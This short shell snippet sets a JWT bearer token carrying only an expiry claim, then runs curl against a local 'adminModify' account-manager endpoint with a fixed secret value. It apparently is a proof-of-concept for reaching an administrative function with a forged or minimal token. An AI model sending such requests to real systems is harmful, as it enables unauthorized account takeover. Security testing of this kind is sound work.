TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTc4NDA1MzZ9.AY3ZK_M7ZItkYHS4_5TTJanlbhbI1QWRum_AENgDuDw'
curl -v -0 -H "Authorization: Bearer $TOKEN" "http://127.0.0.1:80/accountManager/v1/adminModify?secret=88888888"
